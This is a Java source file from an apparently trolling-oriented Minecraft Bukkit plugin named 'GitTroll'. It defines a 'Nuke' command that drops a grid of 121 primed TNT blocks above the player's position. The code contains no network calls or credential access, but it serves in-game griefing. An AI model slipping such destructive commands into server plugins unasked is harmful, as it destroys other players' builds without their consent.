package net.Lenni0451.GitTroll.command.commands.world;

import java.util.List;

import org.bukkit.Location;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.TNTPrimed;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class Nuke extends CommandBase {

	public Nuke() {
		super("Nuke", "Let tnt fly from the sky");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isEmpty()) {
			final int range = 5;
			final int distance = 5;
			for(int x = -range; x <= range; x++) {
				for(int z = -range; z <= range; z++) {
					Location loc = executor.getLocation().add(x * distance, 100, z * distance);
					TNTPrimed tnt = (TNTPrimed) loc.getWorld().spawnEntity(loc, EntityType.PRIMED_TNT);
					tnt.setFuseTicks(100);
				}
			}
			executor.sendGitMessage("A nuke has been launched.");
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {}

}
